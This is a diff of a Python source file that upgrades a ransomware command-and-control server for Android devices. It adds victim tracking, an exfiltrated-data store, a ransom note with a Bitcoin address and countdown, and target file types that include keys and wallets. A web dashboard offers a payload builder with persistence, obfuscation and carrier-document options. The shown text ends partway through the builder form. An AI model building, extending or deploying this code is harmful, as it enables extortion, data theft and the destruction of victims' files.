@@ -1,58 +1,34 @@
 #!/usr/bin/env python3
 """
-SET C2 Server - Sophisticated Encryption Toolkit
-State-of-the-art ransomware C2 with real-time WebSocket control.
-Authorized penetration testing only.
+SET C2 Server v5.0 - Production Command & Control Dashboard
+Flask + SocketIO real-time WebSocket-based C2 with:
+- Live victim overview with real-time status streaming
+- Per-victim event log with timestamps
+- Command broadcast (single target or all victims)
+- Ransom note configuration (pushed live to victims)
+- Exfiltrated data viewer
+- DGA domain pre-registration
+- Built-in payload builder via web UI
 """
 
-import os
-import sys
-import json
-import time
-import uuid
-import ssl
-import sqlite3
-import base64
-import hashlib
-import hmac
-import secrets
-import logging
-import threading
-import queue
+import os, sys, json, time, uuid, ssl, sqlite3, base64, hashlib
+import secrets, logging, threading, hmac
 from datetime import datetime, timedelta
 from pathlib import Path
 from typing import Optional, Dict, List, Any
-from http import HTTPStatus
 
 try:
-    from flask import (
-        Flask, request, jsonify, redirect, url_for,
-        render_template_string, send_file, session, abort
-    )
-    from flask_socketio import SocketIO, emit, join_room, disconnect
+    from flask import Flask, request, jsonify, render_template_string, send_file, abort
+    from flask_socketio import SocketIO, emit, join_room
     import eventlet
     eventlet.monkey_patch()
 except ImportError:
-    print("[!] Required: pip install flask flask-socketio eventlet cryptography")
+    print("[!] Install: pip install flask flask-socketio eventlet cryptography")
     sys.exit(1)
 
-# ============================================================
-# LOGGING - Silent, file-based only
-# ============================================================
-LOG_FILE = Path(__file__).parent / "set_c2.log"
-logging.basicConfig(
-    level=logging.WARNING,
-    format="%(asctime)s [%(levelname)s] %(message)s",
-    handlers=[
-        logging.FileHandler(LOG_FILE),
-        logging.NullHandler()  # Suppress console in production
-    ]
-)
-log = logging.getLogger("SET-C2")
-
-# ============================================================
-# DATABASE - Victim tracking
-# ============================================================
+# ================================================================
+# DATABASE SETUP
+# ================================================================
 DB_PATH = Path(__file__).parent / "set_c2.db"
 
 def init_db():
@@ -61,73 +37,62 @@ def init_db():
     c.executescript("""
         CREATE TABLE IF NOT EXISTS victims (
             id TEXT PRIMARY KEY,
-            device_name TEXT,
-            android_version TEXT,
-            manufacturer TEXT,
-            model TEXT,
-            sdk_level INTEGER,
-            ip TEXT,
-            first_seen TEXT,
-            last_seen TEXT,
+            device_name TEXT, android_version TEXT, manufacturer TEXT,
+            model TEXT, sdk_level INTEGER, ip TEXT,
+            first_seen TEXT, last_seen TEXT,
             status TEXT DEFAULT 'active',
             lock_mode TEXT DEFAULT 'none',
             ransom_paid INTEGER DEFAULT 0,
+            channel TEXT DEFAULT 'unknown',
+            battery INTEGER DEFAULT 100,
             notes TEXT
         );
         CREATE TABLE IF NOT EXISTS commands (
-            id TEXT PRIMARY KEY,
-            victim_id TEXT,
-            command TEXT,
-            params TEXT,
-            status TEXT DEFAULT 'pending',
-            issued_at TEXT,
-            executed_at TEXT,
-            result TEXT,
-            FOREIGN KEY(victim_id) REFERENCES victims(id)
+            id TEXT PRIMARY KEY, victim_id TEXT, command TEXT,
+            params TEXT, status TEXT DEFAULT 'pending',
+            issued_at TEXT, executed_at TEXT, result TEXT
         );
         CREATE TABLE IF NOT EXISTS events (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
-            victim_id TEXT,
-            event_type TEXT,
-            details TEXT,
-            timestamp TEXT,
-            FOREIGN KEY(victim_id) REFERENCES victims(id)
+            victim_id TEXT, event_type TEXT, details TEXT, timestamp TEXT
+        );
+        CREATE TABLE IF NOT EXISTS exfiltrated_data (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            victim_id TEXT, data_type TEXT, content TEXT,
+            received_at TEXT, size INTEGER
         );
         CREATE TABLE IF NOT EXISTS config (
-            key TEXT PRIMARY KEY,
-            value TEXT
+            key TEXT PRIMARY KEY, value TEXT
         );
     """)
-    # Default config
+    
     defaults = {
         "c2_port": "8443",
         "use_ssl": "true",
+        "beacon_interval": "30",
         "ransom_note_template": json.dumps({
-            "title": "YOUR DEVICE HAS BEEN LOCKED",
-            "message": "All your files have been encrypted with AES-256-GCM.\nContact us for decryption.",
+            "title": "YOUR DEVICE HAS BEEN ENCRYPTED",
+            "message": "All files encrypted with AES-256.\nContact for decryption.",
             "amount_btc": 0.5,
             "btc_address": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
             "email": "support@onionmail.com",
             "timer_hours": 72,
-            "background_color": "#8B0000",
-            "text_color": "#FFFFFF"
+            "background_color": "#0a0a0a",
+            "text_color": "#ff3333"
         }),
-        "default_lock_mode": "files",
+        "default_lock_mode": "full",
         "encrypt_extensions": json.dumps([
-            ".txt", ".doc", ".docx", ".xls", ".xlsx", ".pdf",
-            ".jpg", ".jpeg", ".png", ".gif", ".mp4", ".mp3",
-            ".zip", ".rar", ".7z", ".db", ".sqlite", ".csv",
-            ".ppt", ".pptx", ".odt", ".ods", ".odp", ".rtf",
-            ".html", ".htm", ".php", ".js", ".py", ".sql"
+            ".txt",".doc",".docx",".xls",".xlsx",".pdf",
+            ".jpg",".jpeg",".png",".gif",".mp4",".mp3",
+            ".zip",".rar",".7z",".db",".sqlite",".csv",
+            ".ppt",".pptx",".odt",".ods",".odp",".rtf",
+            ".html",".htm",".php",".js",".py",".sql",
+            ".xml",".json",".cfg",".key",".pem",".wallet"
         ]),
         "target_dirs": json.dumps([
-            "/sdcard/Documents",
-            "/sdcard/Download",
-            "/sdcard/Pictures",
-            "/sdcard/DCIM",
-            "/sdcard/Music",
-            "/sdcard/Movies",
-            "/sdcard/Android/media"
+            "/sdcard/Documents","/sdcard/Download","/sdcard/Pictures",
+            "/sdcard/DCIM","/sdcard/Music","/sdcard/Movies",
+            "/sdcard/Android/media","/sdcard/Android/data"
         ])
     }
     for k, v in defaults.items():
@@ -137,11 +102,11 @@ def init_db():
 
 init_db()
 
-# ============================================================
-# HELPER FUNCTIONS
-# ============================================================
+# ================================================================
+# HELPERS
+# ================================================================
 
-def get_config(key: str, default=None) -> str:
+def get_config(key: str, default=None):
     conn = sqlite3.connect(str(DB_PATH))
     c = conn.cursor()
     c.execute("SELECT value FROM config WHERE key=?", (key,))
@@ -177,21 +142,17 @@ def get_all_victims() -> List[Dict]:
 def add_event(victim_id: str, event_type: str, details: str):
     conn = sqlite3.connect(str(DB_PATH))
     c = conn.cursor()
-    c.execute(
-        "INSERT INTO events (victim_id, event_type, details, timestamp) VALUES (?, ?, ?, ?)",
-        (victim_id, event_type, details, datetime.utcnow().isoformat())
-    )
+    c.execute("INSERT INTO events (victim_id, event_type, details, timestamp) VALUES (?,?,?,?)",
+              (victim_id, event_type, details, datetime.utcnow().isoformat()))
     conn.commit()
     conn.close()
 
-def get_victim_events(victim_id: str, limit: int = 100) -> List[Dict]:
+def get_victim_events(victim_id: str, limit=200):
     conn = sqlite3.connect(str(DB_PATH))
     conn.row_factory = sqlite3.Row
     c = conn.cursor()
-    c.execute(
-        "SELECT * FROM events WHERE victim_id=? ORDER BY timestamp DESC LIMIT ?",
-        (victim_id, limit)
-    )
+    c.execute("SELECT * FROM events WHERE victim_id=? ORDER BY timestamp DESC LIMIT ?",
+              (victim_id, limit))
     rows = [dict(r) for r in c.fetchall()]
     conn.close()
     return rows
@@ -200,874 +161,581 @@ def issue_command(victim_id: str, command: str, params: Dict = None) -> str:
     cmd_id = str(uuid.uuid4())
     conn = sqlite3.connect(str(DB_PATH))
     c = conn.cursor()
-    c.execute(
-        "INSERT INTO commands (id, victim_id, command, params, status, issued_at) VALUES (?, ?, ?, ?, 'pending', ?)",
-        (cmd_id, victim_id, command, json.dumps(params or {}), datetime.utcnow().isoformat())
-    )
+    c.execute("INSERT INTO commands (id, victim_id, command, params, status, issued_at) VALUES (?,?,?,?,'pending',?)",
+              (cmd_id, victim_id, command, json.dumps(params or {}), datetime.utcnow().isoformat()))
     conn.commit()
     conn.close()
     return cmd_id
 
-def get_pending_commands(victim_id: str) -> List[Dict]:
-    conn = sqlite3.connect(str(DB_PATH))
-    conn.row_factory = sqlite3.Row
-    c = conn.cursor()
-    c.execute(
-        "SELECT * FROM commands WHERE victim_id=? AND status='pending' ORDER BY issued_at ASC",
-        (victim_id,)
-    )
-    rows = [dict(r) for r in c.fetchall()]
-    conn.close()
-    return rows
-
 def mark_command_executed(cmd_id: str, result: str = None):
     conn = sqlite3.connect(str(DB_PATH))
     c = conn.cursor()
-    c.execute(
-        "UPDATE commands SET status='executed', executed_at=?, result=? WHERE id=?",
-        (datetime.utcnow().isoformat(), result, cmd_id)
-    )
+    c.execute("UPDATE commands SET status='executed', executed_at=?, result=? WHERE id=?",
+              (datetime.utcnow().isoformat(), result, cmd_id))
     conn.commit()
     conn.close()
 
-# ============================================================
-# SSL CERTIFICATE GENERATION
-# ============================================================
+# ================================================================
+# SSL CERT GENERATION
+# ================================================================
 
 def generate_self_signed_cert(cert_path: Path, key_path: Path):
-    """Generate self-signed cert for HTTPS C2."""
-    from cryptography import x509
-    from cryptography.x509.oid import NameOID
-    from cryptography.hazmat.primitives import hashes, serialization
-    from cryptography.hazmat.primitives.asymmetric import rsa
+    try:
+        from cryptography import x509
+        from cryptography.x509.oid import NameOID
+        from cryptography.hazmat.primitives import hashes, serialization
+        from cryptography.hazmat.primitives.asymmetric import rsa
+        
+        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+        subject = issuer = x509.Name([
+            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
+            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "SET-C2"),
+            x509.NameAttribute(NameOID.COMMON_NAME, "set-c2.local"),
+        ])
+        cert = (x509.CertificateBuilder().subject_name(subject).issuer_name(issuer)
+                .public_key(key.public_key()).serial_number(x509.random_serial_number())
+                .not_valid_before(datetime.utcnow())
+                .not_valid_after(datetime.utcnow() + timedelta(days=365))
+                .add_extension(x509.SubjectAlternativeName([x509.DNSName("localhost")]), critical=False)
+                .sign(key, hashes.SHA256()))
+        
+        with open(key_path, "wb") as f:
+            f.write(key.private_bytes(serialization.Encoding.PEM,
+                                      serialization.PrivateFormat.TraditionalOpenSSL,
+                                      serialization.NoEncryption()))
+        with open(cert_path, "wb") as f:
+            f.write(cert.public_bytes(serialization.Encoding.PEM))
+    except Exception as e:
+        print(f"[!] Cert generation failed: {e}")
 
-    key = rsa.generate_private_key(
-        public_exponent=65537,
-        key_size=2048,
-    )
-
-    subject = issuer = x509.Name([
-        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
-        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "SET-C2"),
-        x509.NameAttribute(NameOID.COMMON_NAME, "set-c2.local"),
-    ])
-
-    cert = (
-        x509.CertificateBuilder()
-        .subject_name(subject)
-        .issuer_name(issuer)
-        .public_key(key.public_key())
-        .serial_number(x509.random_serial_number())
-        .not_valid_before(datetime.utcnow())
-        .not_valid_after(datetime.utcnow() + timedelta(days=365))
-        .add_extension(
-            x509.SubjectAlternativeName([x509.DNSName("localhost")]),
-            critical=False,
-        )
-        .sign(key, hashes.SHA256())
-    )
-
-    with open(key_path, "wb") as f:
-        f.write(key.private_bytes(
-            encoding=serialization.Encoding.PEM,
-            format=serialization.PrivateFormat.TraditionalOpenSSL,
-            encryption_algorithm=serialization.NoEncryption(),
-        ))
-    with open(cert_path, "wb") as f:
-        f.write(cert.public_bytes(serialization.Encoding.PEM))
-
-    log.info(f"Self-signed cert generated: {cert_path}")
-
-# ============================================================
-# FLASK APPLICATION
-# ============================================================
+# ================================================================
+# FLASK APP + SOCKETIO
+# ================================================================
 
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(32)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
-# Track connected victims: sid -> {victim_id, device_info}
-connected_victims: Dict[str, Dict] = {}
-# Track connected admin browsers: sid -> admin_session
-admin_sessions: Dict[str, bool] = {}
+connected_victims: Dict[str, Dict] = {}  # sid -> victim_info
 
-# ============================================================
-# WEB INTERFACE - Embedded HTML/CSS/JS Templates
-# ============================================================
-
-# We'll define templates as Python strings for single-file deployment.
+# ================================================================
+# WEB UI - EMBEDDED
+# ================================================================
 
 INDEX_HTML = """<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SET C2 Dashboard</title>
+<title>SET C2 v5.0 Dashboard</title>
 <script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-:root {
-  --bg: #0a0e17;
-  --bg2: #111827;
-  --bg3: #1a2332;
-  --primary: #00f5d4;
-  --primary-dim: rgba(0,245,212,0.15);
-  --danger: #ff3355;
-  --warning: #ffaa33;
-  --success: #33ffaa;
-  --text: #e2e8f0;
-  --text-dim: #8892b0;
-  --border: #1e2d3d;
-  --radius: 8px;
-}
-body {
-  font-family: 'Segoe UI','SF Pro Display',system-ui,-apple-system,sans-serif;
-  background: var(--bg);
-  color: var(--text);
-  min-height: 100vh;
-  display: flex;
-}
-::-webkit-scrollbar { width: 6px; }
-::-webkit-scrollbar-track { background: var(--bg2); }
-::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
-/* Sidebar */
-.sidebar {
-  width: 260px;
-  background: var(--bg2);
-  border-right: 1px solid var(--border);
-  padding: 24px 16px;
-  display: flex;
-  flex-direction: column;
-  flex-shrink: 0;
-}
-.sidebar .logo {
-  font-size: 24px;
-  font-weight: 800;
-  letter-spacing: -0.5px;
-  margin-bottom: 32px;
-}
-.sidebar .logo span { color: var(--primary); }
-.sidebar nav { display: flex; flex-direction: column; gap: 4px; }
-.sidebar nav a {
-  padding: 10px 14px;
-  border-radius: var(--radius);
-  color: var(--text-dim);
-  text-decoration: none;
-  font-size: 14px;
-  font-weight: 500;
-  transition: all 0.2s;
-  display: flex;
-  align-items: center;
-  gap: 10px;
-}
-.sidebar nav a:hover, .sidebar nav a.active {
-  background: var(--primary-dim);
-  color: var(--primary);
-}
-.sidebar .stats-box {
-  margin-top: auto;
-  padding: 16px;
-  background: var(--bg3);
-  border-radius: var(--radius);
-  font-size: 13px;
-}
-.sidebar .stats-box .stat { display: flex; justify-content: space-between; margin: 4px 0; }
-.sidebar .stats-box .stat .label { color: var(--text-dim); }
-.sidebar .stats-box .stat .value { color: var(--primary); font-weight: 600; }
-/* Main */
-.main {
-  flex: 1;
-  padding: 24px 32px;
-  overflow-y: auto;
-  max-height: 100vh;
-}
-.header {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin-bottom: 24px;
-}
-.header h1 { font-size: 28px; font-weight: 700; }
-.header .subtitle { color: var(--text-dim); font-size: 14px; }
-/* Cards */
-.cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-bottom: 24px; }
-.card {
-  background: var(--bg2);
-  border: 1px solid var(--border);
-  border-radius: var(--radius);
-  padding: 20px;
-}
-.card .card-label { font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-dim); margin-bottom: 6px; }
-.card .card-value { font-size: 28px; font-weight: 700; }
-.card .card-value.danger { color: var(--danger); }
-.card .card-value.success { color: var(--success); }
-.card .card-value.warning { color: var(--warning); }
-.card .card-value.primary { color: var(--primary); }
-/* Tables */
-.table-container { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; }
-table { width: 100%; border-collapse: collapse; }
-thead { background: var(--bg3); }
-th { padding: 12px 16px; text-align: left; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-dim); font-weight: 600; }
-td { padding: 12px 16px; border-top: 1px solid var(--border); font-size: 14px; }
-tbody tr { transition: background 0.15s; cursor: pointer; }
-tbody tr:hover { background: var(--primary-dim); }
-.status-badge {
-  display: inline-block;
-  padding: 3px 10px;
-  border-radius: 12px;
-  font-size: 11px;
-  font-weight: 600;
-  text-transform: uppercase;
-  letter-spacing: 0.3px;
-}
-.status-badge.active { background: rgba(0,245,212,0.15); color: var(--primary); }
-.status-badge.locked { background: rgba(255,51,85,0.15); color: var(--danger); }
-.status-badge.pending { background: rgba(255,170,51,0.15); color: var(--warning); }
-.status-badge.paid { background: rgba(51,255,170,0.15); color: var(--success); }
-.status-badge.offline { background: rgba(136,146,176,0.15); color: var(--text-dim); }
-/* Buttons */
-.btn {
-  padding: 8px 16px;
-  border: none;
-  border-radius: var(--radius);
-  font-size: 13px;
-  font-weight: 600;
-  cursor: pointer;
-  transition: all 0.2s;
-}
-.btn-primary { background: var(--primary); color: #000; }
-.btn-primary:hover { opacity: 0.85; }
-.btn-danger { background: var(--danger); color: #fff; }
-.btn-danger:hover { opacity: 0.85; }
-.btn-sm { padding: 5px 10px; font-size: 11px; }
-.btn-ghost { background: transparent; color: var(--text-dim); border: 1px solid var(--border); }
-.btn-ghost:hover { background: var(--bg3); color: var(--text); }
-/* Modal */
-.modal-overlay {
-  display: none;
-  position: fixed;
-  top: 0; left: 0; right: 0; bottom: 0;
-  background: rgba(0,0,0,0.7);
-  backdrop-filter: blur(4px);
-  z-index: 1000;
-  align-items: center;
-  justify-content: center;
-}
-.modal-overlay.active { display: flex; }
-.modal {
-  background: var(--bg2);
-  border: 1px solid var(--border);
-  border-radius: 12px;
-  padding: 24px;
-  width: 560px;
-  max-width: 90vw;
-  max-height: 85vh;
-  overflow-y: auto;
-}
-.modal h2 { margin-bottom: 16px; font-size: 20px; }
-.modal .form-group { margin-bottom: 14px; }
-.modal label { display: block; font-size: 13px; color: var(--text-dim); margin-bottom: 4px; font-weight: 500; }
-.modal input, .modal select, .modal textarea {
-  width: 100%;
-  padding: 10px 12px;
-  background: var(--bg3);
-  border: 1px solid var(--border);
-  border-radius: var(--radius);
-  color: var(--text);
-  font-size: 14px;
-}
-.modal textarea { min-height: 80px; resize: vertical; font-family: monospace; }
-.modal .btn-row { display: flex; gap: 8px; justify-content: flex-end; margin-top: 16px; }
-/* Live log */
-.log-viewer {
-  background: #000;
-  border: 1px solid var(--border);
-  border-radius: var(--radius);
-  padding: 12px;
-  max-height: 300px;
-  overflow-y: auto;
-  font-family: 'JetBrains Mono','Fira Code',monospace;
-  font-size: 12px;
-  line-height: 1.6;
-}
-.log-viewer .log-entry { color: var(--text-dim); }
-.log-viewer .log-entry.info { color: var(--primary); }
-.log-viewer .log-entry.warn { color: var(--warning); }
-.log-viewer .log-entry.error { color: var(--danger); }
-.log-viewer .log-entry.system { color: #8888ff; }
-.tab-bar { display: flex; gap: 2px; margin-bottom: 16px; background: var(--bg3); border-radius: var(--radius); padding: 2px; }
-.tab-bar .tab {
-  padding: 8px 18px;
-  border: none;
-  background: transparent;
-  color: var(--text-dim);
-  font-size: 13px;
-  font-weight: 500;
-  cursor: pointer;
-  border-radius: 6px;
-  transition: all 0.2s;
-}
-.tab-bar .tab.active { background: var(--primary); color: #000; }
-.tab-bar .tab:hover:not(.active) { color: var(--text); }
-.hidden { display: none; }
-.flex { display: flex; }
-.gap-2 { gap: 8px; }
-.gap-4 { gap: 16px; }
-.items-center { align-items: center; }
-.justify-between { justify-content: space-between; }
-.mb-4 { margin-bottom: 16px; }
-.mt-4 { margin-top: 16px; }
-.text-sm { font-size: 13px; }
-.text-dim { color: var(--text-dim); }
-.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
-@media (max-width: 768px) {
-  .sidebar { display: none; }
-  .main { padding: 16px; }
-  .grid-2 { grid-template-columns: 1fr; }
-}
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{--bg:#05080f;--bg2:#0c1421;--bg3:#111d33;--primary:#00f0ff;--primary-dim:rgba(0,240,255,0.1);--danger:#ff1a4a;--warning:#ffaa33;--success:#00ff88;--text:#d0d8f0;--text-dim:#7888a0;--border:#1a2840;--radius:6px;}
+body{font-family:'Inter','Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;}
+::-webkit-scrollbar{width:5px;}
+::-webkit-scrollbar-track{background:var(--bg2);}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
+.sidebar{width:240px;background:var(--bg2);border-right:1px solid var(--border);padding:20px 14px;display:flex;flex-direction:column;flex-shrink:0;}
+.sidebar .logo{font-size:22px;font-weight:800;margin-bottom:28px;letter-spacing:-0.5px;}
+.sidebar .logo span{color:var(--primary);}
+.sidebar nav{display:flex;flex-direction:column;gap:2px;}
+.sidebar nav a{padding:9px 12px;border-radius:var(--radius);color:var(--text-dim);text-decoration:none;font-size:13px;font-weight:500;transition:.15s;display:flex;align-items:center;gap:8px;}
+.sidebar nav a:hover,.sidebar nav a.active{background:var(--primary-dim);color:var(--primary);}
+.sidebar .stats{margin-top:auto;padding:14px;background:var(--bg3);border-radius:var(--radius);font-size:12px;}
+.sidebar .stats .row{display:flex;justify-content:space-between;margin:3px 0;}
+.sidebar .stats .row .val{color:var(--primary);font-weight:600;}
+.main{flex:1;padding:20px 28px;overflow-y:auto;max-height:100vh;}
+.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;}
+.header h1{font-size:24px;font-weight:700;}
+.header .sub{color:var(--text-dim);font-size:13px;}
+.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px;margin-bottom:20px;}
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:16px;}
+.card .lbl{font-size:10px;text-transform:uppercase;letter-spacing:.5px;color:var(--text-dim);margin-bottom:4px;}
+.card .val{font-size:26px;font-weight:700;}
+.card .val.danger{color:var(--danger);}
+.card .val.success{color:var(--success);}
+.card .val.primary{color:var(--primary);}
+.card .val.warning{color:var(--warning);}
+.table-wrap{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;}
+table{width:100%;border-collapse:collapse;}
+thead{background:var(--bg3);}
+th{padding:10px 14px;text-align:left;font-size:11px;text-transform:uppercase;letter-spacing:.4px;color:var(--text-dim);font-weight:600;}
+td{padding:10px 14px;border-top:1px solid var(--border);font-size:13px;}
+tbody tr{transition:.12s;cursor:pointer;}
+tbody tr:hover{background:var(--primary-dim);}
+.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.2px;}
+.badge.active{background:rgba(0,240,255,0.12);color:var(--primary);}
+.badge.locked{background:rgba(255,26,74,0.12);color:var(--danger);}
+.badge.offline{background:rgba(120,136,160,0.12);color:var(--text-dim);}
+.badge.paid{background:rgba(0,255,136,0.12);color:var(--success);}
+.btn{padding:7px 14px;border:none;border-radius:var(--radius);font-size:12px;font-weight:600;cursor:pointer;transition:.15s;}
+.btn-primary{background:var(--primary);color:#000;}
+.btn-primary:hover{opacity:.8;}
+.btn-danger{background:var(--danger);color:#fff;}
+.btn-danger:hover{opacity:.8;}
+.btn-sm{padding:4px 8px;font-size:10px;}
+.btn-ghost{background:transparent;color:var(--text-dim);border:1px solid var(--border);}
+.btn-ghost:hover{background:var(--bg3);color:var(--text);}
+.modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);backdrop-filter:blur(4px);z-index:1000;align-items:center;justify-content:center;}
+.modal-overlay.active{display:flex;}
+.modal{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:24px;width:600px;max-width:90vw;max-height:85vh;overflow-y:auto;}
+.modal h2{margin-bottom:14px;font-size:18px;}
+.modal .fg{margin-bottom:12px;}
+.modal label{display:block;font-size:12px;color:var(--text-dim);margin-bottom:3px;font-weight:500;}
+.modal input,.modal select,.modal textarea{width:100%;padding:8px 10px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);color:var(--text);font-size:13px;}
+.modal textarea{min-height:60px;resize:vertical;font-family:monospace;font-size:12px;}
+.modal .br{display:flex;gap:8px;justify-content:flex-end;margin-top:14px;}
+.hidden{display:none;}
+.flex{display:flex;}
+.gap-2{gap:8px;}
+.gap-4{gap:16px;}
+.ac{align-items:center;}
+.jb{justify-content:space-between;}
+.mb{margin-bottom:14px;}
+.mt{margin-top:14px;}
+.t-sm{font-size:12px;}
+.t-dim{color:var(--text-dim);}
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
+.log-box{background:#000;border:1px solid var(--border);border-radius:var(--radius);padding:10px;max-height:250px;overflow-y:auto;font-family:'Fira Code','JetBrains Mono',monospace;font-size:11px;line-height:1.5;}
+.log-box .entry{color:var(--primary);}
+.log-box .entry.warn{color:var(--warning);}
+.log-box .entry.err{color:var(--danger);}
+.log-box .entry.sys{color:#8888ff;}
+.tabs{display:flex;gap:2px;margin-bottom:14px;background:var(--bg3);border-radius:var(--radius);padding:2px;}
+.tabs button{padding:6px 16px;border:none;background:transparent;color:var(--text-dim);font-size:12px;font-weight:500;cursor:pointer;border-radius:5px;transition:.15s;}
+.tabs button.active{background:var(--primary);color:#000;}
+@media(max-width:768px){.sidebar{display:none;}.main{padding:14px;}.g2{grid-template-columns:1fr;}}
 </style>
 </head>
 <body>
 
+<!-- SIDEBAR -->
 <div class="sidebar">
-  <div class="logo"><span>SET</span> C2</div>
-  <nav>
-    <a href="#" class="active" data-page="dashboard">📊 Dashboard</a>
-    <a href="#" data-page="victims">🎯 Victims</a>
-    <a href="#" data-page="builder">📦 Builder</a>
-    <a href="#" data-page="config">⚙️ Config</a>
-  </nav>
-  <div class="stats-box" id="sidebarStats">
-    <div class="stat"><span class="label">Online</span><span class="value" id="statOnline">0</span></div>
-    <div class="stat"><span class="label">Total Victims</span><span class="value" id="statTotal">0</span></div>
-    <div class="stat"><span class="label">Locked</span><span class="value" style="color:var(--danger)" id="statLocked">0</span></div>
-    <div class="stat"><span class="label">Paid</span><span class="value" style="color:var(--success)" id="statPaid">0</span></div>
-  </div>
+<div class="logo"><span>SET</span> C2</div>
+<nav>
+<a href="#" class="active" data-page="dashboard">&#9783; Dashboard</a>
+<a href="#" data-page="victims">&#127919; Victims</a>
+<a href="#" data-page="builder">&#128230; Builder</a>
+<a href="#" data-page="exfil">&#128230; Exfil Data</a>
+<a href="#" data-page="config">&#9881; Config</a>
+</nav>
+<div class="stats">
+<div class="row"><span>Online</span><span class="val" id="sOnline">0</span></div>
+<div class="row"><span>Total</span><span class="val" id="sTotal">0</span></div>
+<div class="row"><span>Locked</span><span class="val" style="color:var(--danger)" id="sLocked">0</span></div>
+<div class="row"><span>Paid</span><span class="val" style="color:var(--success)" id="sPaid">0</span></div>
+</div>
 </div>
 
+<!-- MAIN -->
 <div class="main">
-  <!-- HEADER -->
-  <div class="header">
-    <div>
-      <h1 id="pageTitle">Dashboard</h1>
-      <div class="subtitle" id="pageSubtitle">Real-time command & control center</div>
-    </div>
-    <div class="flex gap-2 items-center">
-      <span class="text-sm text-dim" id="connectionStatus">● Connecting...</span>
-    </div>
-  </div>
-
-  <!-- PAGE: DASHBOARD -->
-  <div id="page-dashboard">
-    <div class="cards" id="dashboardCards">
-      <div class="card"><div class="card-label">Victims Online</div><div class="card-value primary" id="dashOnline">0</div></div>
-      <div class="card"><div class="card-label">Total Infected</div><div class="card-value" id="dashTotal">0</div></div>
-      <div class="card"><div class="card-label">Currently Locked</div><div class="card-value danger" id="dashLocked">0</div></div>
-      <div class="card"><div class="card-label">Ransom Paid</div><div class="card-value success" id="dashPaid">0</div></div>
-    </div>
-    <div class="mb-4">
-      <div class="tab-bar">
-        <button class="tab active" data-tab="recent">Recent Activity</button>
-        <button class="tab" data-tab="live">Live Log</button>
-      </div>
-      <div id="tab-recent">
-        <div class="table-container">
-          <table>
-            <thead><tr><th>Victim</th><th>Event</th><th>Details</th><th>Time</th></tr></thead>
-            <tbody id="recentEvents"></tbody>
-          </table>
-        </div>
-      </div>
-      <div id="tab-live" class="hidden">
-        <div class="log-viewer" id="liveLog"></div>
-      </div>
-    </div>
-  </div>
-
-  <!-- PAGE: VICTIMS -->
-  <div id="page-victims" class="hidden">
-    <div class="table-container">
-      <table>
-        <thead>
-          <tr>
-            <th>Victim ID</th><th>Device</th><th>Android</th><th>IP</th>
-            <th>Status</th><th>Lock Mode</th><th>Last Seen</th><th>Actions</th>
-          </tr>
-        </thead>
-        <tbody id="victimsTable"></tbody>
-      </table>
-    </div>
-  </div>
-
-  <!-- PAGE: BUILDER -->
-  <div id="page-builder" class="hidden">
-    <div class="grid-2">
-      <div class="card">
-        <h3 class="mb-4">📦 Payload Builder</h3>
-        <div class="form-group">
-          <label>C2 Server Host</label>
-          <input type="text" id="builderHost" value="localhost" placeholder="Your C2 server IP/domain">
-        </div>
-        <div class="form-group">
-          <label>C2 Port</label>
-          <input type="number" id="builderPort" value="8443">
-        </div>
-        <div class="form-group">
-          <label>Use SSL</label>
-          <select id="builderSSL"><option value="true">Yes (HTTPS/WSS)</option><option value="false">No (HTTP/WS)</option></select>
-        </div>
-        <div class="form-group">
-          <label>Default Lock Mode</label>
-          <select id="builderLockMode">
-            <option value="files">Files Only</option>
-            <option value="screen">Screen Lock</option>
-            <option value="full">Full Device Lock</option>
-            <option value="sensors">Sensor Block</option>
-            <option value="apps">App Lock</option>
-          </select>
-        </div>
-        <div class="form-group">
-          <label>Persistence Level</label>
-          <select id="builderPersist">
-            <option value="none">None (Single-run)</option>
-            <option value="service">Foreground Service</option>
-            <option value="boot">Boot Receiver</option>
-            <option value="device_admin">Device Admin + Boot</option>
-          </select>
-        </div>
-        <div class="form-group">
-          <label>Obfuscation Level</label>
-          <select id="builderObfuscation">
-            <option value="none">None</option>
-            <option value="base64">Base64 Encode</option>
-            <option value="xor">XOR + Base64</option>
-            <option value="aes">AES Encrypted Stager</option>
-          </select>
-        </div>
-        <div class="form-group">
-          <label>Carrier Document Type</label>
-          <select id="builderCarrier">
-            <option value="apk">APK (Android App)</option>
-            <option value="pdf">PDF Document</option>
-            <option value="docx">Word Document</option>
